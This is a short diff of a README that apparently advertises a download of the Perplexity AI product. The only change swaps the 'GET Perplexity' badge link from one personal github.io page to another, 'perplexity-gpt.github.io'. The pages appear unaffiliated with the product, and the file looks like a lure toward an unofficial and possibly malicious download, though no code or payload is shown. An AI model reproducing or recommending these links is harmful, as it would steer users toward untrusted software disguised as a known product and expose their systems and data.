@@ -3,7 +3,7 @@
 
 ![Perplexity](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSLmWQhTXcpcfb5wzJx2ForCgS5zwXkgScKTZeiddCjwg&s=10)
 
-[![GET Perplexity](https://img.shields.io/badge/GET%20%E2%80%94%20Perplexity-0078D6?style=for-the-badge&logoColor=white)](https://karenmitchelln447.github.io/.github/perplexity-download)
+[![GET Perplexity](https://img.shields.io/badge/GET%20%E2%80%94%20Perplexity-0078D6?style=for-the-badge&logoColor=white)](https://perplexity-gpt.github.io/.github/)
 
 ---
 
